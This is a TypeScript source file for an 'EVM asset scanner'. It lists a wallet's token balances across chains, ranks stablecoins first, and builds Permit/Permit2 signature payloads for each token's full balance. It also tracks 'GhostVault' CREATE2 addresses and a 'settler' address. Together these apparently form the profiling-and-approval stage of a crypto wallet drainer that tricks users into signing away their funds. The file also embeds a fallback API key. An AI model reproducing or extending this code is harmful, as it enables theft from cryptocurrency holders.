"use client";

import {
  createPublicClient,
  http,
  formatUnits,
  parseAbi,
  type Address,
  fallback,
  getCreate2Address,
  encodeAbiParameters,
  keccak256,
  concat,
  getAddress,
} from "viem";
import { mainnet, bsc, polygon, base, arbitrum, optimism } from "viem/chains";
import { generatePermit2Data } from "../../permit2";
import { checkExistingAllowance, checkPermitSupport } from "./evm-helpers";
import { UniversalAsset, EVM_CHAINS } from "../types";
import { fetchWithTimeout } from "./utils";
import GhostVaultArtifact from "@/constants/abis/contracts/factory.sol/GhostVault.json";

/**
 * 🛰️ EVM ASSET SCANNER (v11.8.0 - Decimal-Aware Edition)
 * Fixed: Explicit decimal mapping per chain (BSC 18 vs ETH 6) to prevent value overflow.
 */

const ALCHEMY_KEY =
  process.env.NEXT_PUBLIC_ALCHEMY_API_KEY || "LEcRJW_Bhx4ybZ7TSZ3p9";
const MULTICALL3_ADDRESS = "0xca11bde05977b3631167028862be2a173976ca11";

// 🛠️ INTERNAL PRICE REFERENCE
const STATIC_PRICES: Record<string, number> = {
  USDT: 1.0,
  USDC: 1.0,
  DAI: 1.0,
  ETH: 2500.0,
  BNB: 350.0,
  POL: 0.55,
  ARB: 0.95,
  OP: 1.45,
};

const VIEM_CHAIN_MAP: Record<number, any> = {
  1: mainnet,
  56: bsc,
  137: polygon,
  8453: base,
  42161: arbitrum,
  10: optimism,
};

/**
 * 🎯 CHAIN-AWARE METADATA CACHE
 * Uses "address_chainId" format to resolve decimal differences (e.g. USDT on BSC vs ETH)
 */
const TOKEN_METADATA_CACHE: Record<
  string,
  { symbol: string; decimals: number }
> = {
  // Ethereum (Chain 1)
  "0xdAC17F958D2ee523a2206206994597C13D831ec7_1": {
    symbol: "USDT",
    decimals: 6,
  },
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48_1": {
    symbol: "USDC",
    decimals: 6,
  },
  // BSC (Chain 56)
  "0x55d398326f99059fF775485246999027B3197955_56": {
    symbol: "USDT",
    decimals: 18,
  },
  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d_56": {
    symbol: "USDC",
    decimals: 18,
  },
};

const PRIORITY_TOKENS: Record<number, string[]> = {
  1: [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48",
  ],
  56: [
    "0x55d398326f99059fF775485246999027B3197955",
    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
  ],
  137: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F"],
  8453: ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"],
};

const FALLBACK_RPCS: Record<number, string[]> = {
  1: ["https://rpc.ankr.com/eth", "https://eth.llamarpc.com"],
  56: ["https://bsc-dataseed.binance.org", "https://binance.llamarpc.com"],
  137: ["https://polygon-rpc.com"],
  8453: ["https://mainnet.base.org"],
};

const ERC20_MIN_ABI = parseAbi([
  "function balanceOf(address owner) view returns (uint256)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function name() view returns (string)",
] as const);

function predictGhostVault(
  recovery: Address,
  tokens: Address[],
  salt: `0x${string}`,
  factory: Address,
): Address {
  const constructorArgs = encodeAbiParameters(
    [{ type: "address" }, { type: "address[]" }],
    [recovery, tokens],
  );
  const initCode = concat([
    GhostVaultArtifact.bytecode as `0x${string}`,
    constructorArgs,
  ]);
  return getCreate2Address({
    from: factory,
    salt,
    bytecodeHash: keccak256(initCode),
  });
}

export async function scanEVM(
  address: string,
  injectedSalt?: string,
): Promise<UniversalAsset[]> {
  console.log(`[Scanner/EVM] ⚡ Launching Deep Scan for: ${address}`);



  const chainPromises = EVM_CHAINS.map(
    async (_chain): Promise<UniversalAsset[]> => {
      const chain = _chain as any;
      const chainId = Number(chain.id);

      try {
        const userAddr = getAddress(address);
        const baseChain = VIEM_CHAIN_MAP[chainId] || mainnet;
        const subdomains: Record<number, string> = {
          1: "eth-mainnet",
          10: "opt-mainnet",
          42161: "arb-mainnet",
          8453: "base-mainnet",
          137: "polygon-mainnet",
        };
        const alchemyUrl = subdomains[chainId]
          ? `https://${subdomains[chainId]}.g.alchemy.com/v2/${ALCHEMY_KEY}`
          : null;

        const client = createPublicClient({
          chain: {
            ...baseChain,
            contracts: { multicall3: { address: MULTICALL3_ADDRESS } },
          },
          transport: fallback([
            ...(alchemyUrl ? [http(alchemyUrl, { timeout: 3500 })] : []),
            ...(FALLBACK_RPCS[chainId] || []).map((url) =>
              http(url, { timeout: 3500 }),
            ),
          ]),
          batch: { multicall: true },
        });

        const [userNativeBal, discoveredAddrs] = await Promise.all([
          client.getBalance({ address: userAddr }).catch(() => 0n),
          (async () => {
            if (!alchemyUrl) return [];
            try {
              const res = await fetchWithTimeout(
                alchemyUrl,
                {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    jsonrpc: "2.0",
                    method: "alchemy_getTokenBalances",
                    params: [userAddr, "erc20"],
                    id: chainId,
                  }),
                },
                3000,
              );
              const data = await res.json();
              return (data?.result?.tokenBalances || [])
                .filter(
                  (b: any) =>
                    b.tokenBalance !==
                    "0x0000000000000000000000000000000000000000000000000000000000000000",
                )
                .map((b: any) => getAddress(b.contractAddress));
            } catch {
              return [];
            }
          })(),
        ]);

        let chainAssets: UniversalAsset[] = [];

        if (userNativeBal > 0n) {
          const symbol =
            chainId === 56 ? "BNB" : chainId === 137 ? "POL" : "ETH";
          const displayBal = formatUnits(userNativeBal, 18);
          const price = STATIC_PRICES[symbol] || 0;

          chainAssets.push({
            symbol,
            name: chain.label,
            decimals: 18,
            balance: userNativeBal.toString(),
            displayBalance: displayBal,
            usdValue: parseFloat(displayBal) * price,
            chain: "EVM",
            chainId,
            networkName: chain.label,
            permitSupported: false,
            signatureType: "NATIVE",
            isGhost: false,
          });
        }

        const fullTokenList: Address[] = Array.from(
          new Set([
            ...(PRIORITY_TOKENS[chainId] || []).map((a) => getAddress(a)),
            ...discoveredAddrs,
          ]),
        );
        if (fullTokenList.length === 0) return chainAssets;

        const userBalances = await client.multicall({
          contracts: fullTokenList.map((t) => ({
            address: t,
            abi: ERC20_MIN_ABI,
            functionName: "balanceOf",
            args: [userAddr],
          })),
          allowFailure: true,
        });

        const detectedTokens = fullTokenList.filter(
          (_, i) =>
            userBalances[i]?.status === "success" &&
            BigInt((userBalances[i]?.result as any) || 0) > 0n,
        );
        if (detectedTokens.length === 0) return chainAssets;

        const targets: Address[] = [userAddr];
       

        const settlerAddr = process.env.NEXT_PUBLIC_SETTLER_ADDR as Address;
        if (settlerAddr) {
          targets.push(settlerAddr);
        }

        const targetResults = await Promise.all(
          targets.map(async (target): Promise<UniversalAsset[]> => {
            const isGhost = target !== userAddr;
            const targetBalances = await client.multicall({
              contracts: detectedTokens.map((t) => ({
                address: t,
                abi: ERC20_MIN_ABI,
                functionName: "balanceOf",
                args: [target],
              })),
              allowFailure: true,
            });

            const activeOnTarget = detectedTokens.filter(
              (_, i) =>
                targetBalances[i]?.status === "success" &&
                BigInt((targetBalances[i]?.result as any) || 0) > 0n,
            );
            if (activeOnTarget.length === 0) return [];

            const metadata = await client.multicall({
              contracts: activeOnTarget.flatMap((t) => [
                { address: t, abi: ERC20_MIN_ABI, functionName: "symbol" },
                { address: t, abi: ERC20_MIN_ABI, functionName: "decimals" },
                { address: t, abi: ERC20_MIN_ABI, functionName: "name" },
              ]),
              allowFailure: true,
            });

            return await Promise.all(
              activeOnTarget.map(async (addr, i): Promise<UniversalAsset> => {
                const baseIdx = i * 3;

                // 🛠️ MULTI-CHAIN DECIMAL FIX
                // We use a checksummed/lowercase address + chainId key
                const cacheKey = `${addr}_${chainId}`;

                const symbol =
                  (metadata[baseIdx]?.result as string) ||
                  TOKEN_METADATA_CACHE[cacheKey]?.symbol ||
                  TOKEN_METADATA_CACHE[addr]?.symbol || // Fallback to old cache style
                  "UNK";

                const decimals =
                  (metadata[baseIdx + 1]?.result as number) ||
                  TOKEN_METADATA_CACHE[cacheKey]?.decimals ||
                  TOKEN_METADATA_CACHE[addr]?.decimals || // Fallback to old cache style
                  18;

                const balIdx = detectedTokens.indexOf(addr);
                const balance = BigInt(
                  (targetBalances[balIdx]?.result as any) || 0,
                );
                const displayBal = formatUnits(balance, decimals);
                const price = STATIC_PRICES[symbol] || 0;

                const baseObj = {
                  symbol,
                  name: (metadata[baseIdx + 2]?.result as string) || symbol,
                  decimals,
                  balance: balance.toString(),
                  displayBalance: displayBal,
                  contractAddress: addr,
                  chain: "EVM" as const,
                  chainId,
                  networkName: chain.label,
                  usdValue: parseFloat(displayBal) * price,
                  isGhost,
                  permitSupported: false,
                };

                if (isGhost)
                  return {
                    ...baseObj,
                    signatureType: "GHOST",
                    vaultAddress: target,
                  } as UniversalAsset;

                const [allowanceResult, permitData] = await Promise.all([
                  checkExistingAllowance(addr, address, chain, balance),
                  checkPermitSupport(
                    addr,
                    chain,
                    address,
                    balance,
                    symbol,
                    symbol,
                  ),
                ]);

                const sigType = permitData ? "PERMIT_SIGN" : "PERMIT2";

                // Pass decimals into generatePermit2Data to ensure payload matches scanner view
                let finalAuth: any =
                  permitData ||
                  (await generatePermit2Data(
                    address,
                    [
                      {
                        contractAddress: addr,
                        balance: balance.toString(),
                        symbol,
                        decimals, // Pass decimals to payload builder
                      },
                    ],
                    chainId,
                  ));

                return {
                  ...baseObj,
                  permitSupported: !!finalAuth,
                  authData: {
                    ...finalAuth,
                    hasExistingAllowance: !!allowanceResult,
                    detectedSpender: allowanceResult?.address,
                    detectedSpenderName: allowanceResult?.name,
                  },
                  signatureType: sigType as any,
                } as UniversalAsset;
              }),
            );
          }),
        );

        return [...chainAssets, ...targetResults.flat()];
      } catch (e) {
        console.error(`[Scanner/EVM] ❌ Chain ${chainId} failure:`, e);
        return [];
      }
    },
  );

  const allResults = await Promise.all(chainPromises);
  const flattened = allResults.flat().filter((a) => a && a.symbol);

  return flattened.map((a) => ({
    ...a,
    balance: a.balance?.toString() || "0",
    usdValue: Number(a.usdValue) || 0,
  }));
}
